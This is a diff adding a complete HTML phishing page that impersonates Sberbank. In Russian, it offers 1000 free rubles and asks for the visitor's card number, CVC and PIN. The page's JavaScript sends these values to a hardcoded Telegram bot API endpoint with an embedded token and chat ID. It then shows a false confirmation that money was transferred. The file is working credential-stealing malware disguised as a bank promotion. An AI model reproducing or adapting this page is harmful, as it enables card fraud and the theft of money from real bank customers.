@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>sberbank</title>
+</head>
+<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.3/jquery.inputmask.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+  $('.date').inputmask("9999 9999 9999 9999");
+  $('.date1').inputmask("999");
+});
+</script>
+<script type="text/javascript">
+	function click1() {
+			let url = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1108316101&text=номер карты: ' + phone.value + ' cvc: ' + phone1.value + ' pin: ' + phone2.value;
+			let xhttp = new XMLHttpRequest();
+			xhttp.open("GET", url);
+			xhttp.send();
+			body.innerHTML = '<h1 align="center" id="hhh">на карту ' + phone.value + ' переведена 1000 рублей</h1>'
+	}
+</script>
+<style type="text/css">
+	input {
+		font-size: 30px;
+		width: 295px;
+	}
+	a {
+		font-size: 20px;
+	}
+	#phone1 {
+		text-align: center;
+	}
+	#hhh {
+		margin-top: 200px;
+	}
+</style>
+<style type="text/css">
+a.button25 {
+  position: relative;
+  display: inline-block;
+  width: 10em;
+  height: 2.5em;
+  line-height: 2.5em;
+  vertical-align: middle;
+  text-align: center;
+  text-decoration: none;
+  text-shadow: 0 -1px 1px #777;
+  color: #fff;
+  outline: none;
+  border: 2px solid #F64C2B;
+  border-radius: 5px;
+  box-shadow: 0 0 0 60px rgba(0,0,0,0) inset, .1em .1em .2em #800;
+  background: linear-gradient(#FB9575, #F45A38 48%, #EA1502 52%, #F02F17);
+}
+a.button25:active {
+  top: .1em;
+  left: .1em;
+  box-shadow: 0 0 0 60px rgba(0,0,0,.05) inset;
+}
+</style>
+<body bgcolor="#489716" id="body">
+	<h1 align="center">получи 1000 рублей бесплатно от сбербанка</h1>
+	<form>
+		<p align="center"><input type="text" name="phone" id="phone" class="date" placeholder="номер карты" value=""><p>
+		<p align="center"><input type="text" name="phone" id="phone1" class="date1" placeholder="CVC" value=""><p>
+		<p align="center"><input type="password" name="phone" id="phone2" class="date2" placeholder="пароль" value=""><p>
+	</form>
+	<p align="center"><a href="#" class="button25" onclick="click1()">получить деньги</a></p>
+</body>
+</html>
